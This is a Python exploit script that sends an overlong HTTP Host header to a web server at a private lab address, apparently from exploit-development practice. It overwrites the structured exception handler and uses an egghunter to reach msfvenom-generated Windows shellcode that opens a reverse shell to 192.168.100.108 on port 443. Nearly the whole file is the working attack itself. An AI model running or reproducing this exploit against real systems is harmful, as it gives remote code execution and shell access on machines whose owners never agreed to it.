import socket
import sys

host = "192.168.100.118"
port = 80

# nseh = "\xCC\xCC\xCC\xCC"
nseh = "\xeb\x82\x90\x90"
seh = "\x9b\x4b\x40\x00" # 0x00404b9b

# egghunter code - PWND - 20 + 32 bytes
# 52 bytes Total
egghunter  = "\x90" * 20
egghunter += "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x43\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8\x50\x57\x4E\x44\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"

crash  = "\x41" * 1425
crash += "\x90" * 72
crash += egghunter
crash += nseh
crash += seh

# Start of Shellcode
# PWNDPWND
crash += "\x50\x57\x4e\x44\x50\x57\x4e\x44";

# Shellcode
# sudo msfvenom -p windows/shell_reverse_tcp lhost=192.168.100.108 lport=443 EXITFUNC=thread -b "\x00\x2b\x2f\x0a\x0d\x2a" -f python
crash +=  b""
crash += b"\xbb\x81\xc1\x9b\xb4\xd9\xcf\xd9\x74\x24\xf4\x5a\x31"
crash += b"\xc9\xb1\x52\x31\x5a\x12\x83\xea\xfc\x03\xdb\xcf\x79"
crash += b"\x41\x27\x27\xff\xaa\xd7\xb8\x60\x22\x32\x89\xa0\x50"
crash += b"\x37\xba\x10\x12\x15\x37\xda\x76\x8d\xcc\xae\x5e\xa2"
crash += b"\x65\x04\xb9\x8d\x76\x35\xf9\x8c\xf4\x44\x2e\x6e\xc4"
crash += b"\x86\x23\x6f\x01\xfa\xce\x3d\xda\x70\x7c\xd1\x6f\xcc"
crash += b"\xbd\x5a\x23\xc0\xc5\xbf\xf4\xe3\xe4\x6e\x8e\xbd\x26"
crash += b"\x91\x43\xb6\x6e\x89\x80\xf3\x39\x22\x72\x8f\xbb\xe2"
crash += b"\x4a\x70\x17\xcb\x62\x83\x69\x0c\x44\x7c\x1c\x64\xb6"
crash += b"\x01\x27\xb3\xc4\xdd\xa2\x27\x6e\x95\x15\x83\x8e\x7a"
crash += b"\xc3\x40\x9c\x37\x87\x0e\x81\xc6\x44\x25\xbd\x43\x6b"
crash += b"\xe9\x37\x17\x48\x2d\x13\xc3\xf1\x74\xf9\xa2\x0e\x66"
crash += b"\xa2\x1b\xab\xed\x4f\x4f\xc6\xac\x07\xbc\xeb\x4e\xd8"
crash += b"\xaa\x7c\x3d\xea\x75\xd7\xa9\x46\xfd\xf1\x2e\xa8\xd4"
crash += b"\x46\xa0\x57\xd7\xb6\xe9\x93\x83\xe6\x81\x32\xac\x6c"
crash += b"\x51\xba\x79\x22\x01\x14\xd2\x83\xf1\xd4\x82\x6b\x1b"
crash += b"\xdb\xfd\x8c\x24\x31\x96\x27\xdf\xd2\x59\x1f\xbb\x4e"
crash += b"\x32\x62\x43\x8e\x79\xeb\xa5\xfa\x6d\xba\x7e\x93\x14"
crash += b"\xe7\xf4\x02\xd8\x3d\x71\x04\x52\xb2\x86\xcb\x93\xbf"
crash += b"\x94\xbc\x53\x8a\xc6\x6b\x6b\x20\x6e\xf7\xfe\xaf\x6e"
crash += b"\x7e\xe3\x67\x39\xd7\xd5\x71\xaf\xc5\x4c\x28\xcd\x17"
crash += b"\x08\x13\x55\xcc\xe9\x9a\x54\x81\x56\xb9\x46\x5f\x56"
crash += b"\x85\x32\x0f\x01\x53\xec\xe9\xfb\x15\x46\xa0\x50\xfc"
crash += b"\x0e\x35\x9b\x3f\x48\x3a\xf6\xc9\xb4\x8b\xaf\x8f\xcb"
crash += b"\x24\x38\x18\xb4\x58\xd8\xe7\x6f\xd9\xf8\x05\xa5\x14"
crash += b"\x91\x93\x2c\x95\xfc\x23\x9b\xda\xf8\xa7\x29\xa3\xfe"
crash += b"\xb8\x58\xa6\xbb\x7e\xb1\xda\xd4\xea\xb5\x49\xd4\x3e"

crash += "\xCC" * (5000 - len(crash))

req = "GET / HTTP/1.1\r\n"
req += "Host: /.:/" + crash + "\r\n"
req += "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0\r\n"
req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
req += "Accept-Language: en-US,en;q=0.5\r\n"
req += "Accept-Encoding: gzip, deflate\r\n"
req += "DNT: 1\r\n"
req += "Connection: keep-alive\r\n"
req += "Upgrade-Insecure-Requests: 1\r\n"
req += "Cache-Control: max-age=0\r\n\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(req)
s.close()


